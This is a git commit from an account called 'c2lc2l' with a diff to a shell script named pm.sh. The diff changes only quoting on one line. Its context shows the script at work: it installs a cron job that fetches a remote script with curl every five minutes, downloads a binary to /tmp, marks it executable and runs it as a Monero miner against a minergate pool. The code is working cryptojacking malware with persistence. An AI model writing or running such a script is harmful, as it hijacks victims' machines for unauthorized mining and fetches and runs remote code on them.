5698e9e47fde1c35a097535a4a36b6f79c413509
c2lc2l <c2l@protonmail.com>
2017-07-10 00:25:43 +0800

    Update pm.sh

--- pm.sh
+++ pm.sh
@@ -5,7 +5,7 @@ echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/mas
 Doc2l()
 {
 if [ ! -f "/tmp/c2l" ];then
-wget -O /tmp/c2l https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip
+wget -O "/tmp/c2l" "https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip"
 fi
 chmod +x /tmp/c21
 /tmp/c2l -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr
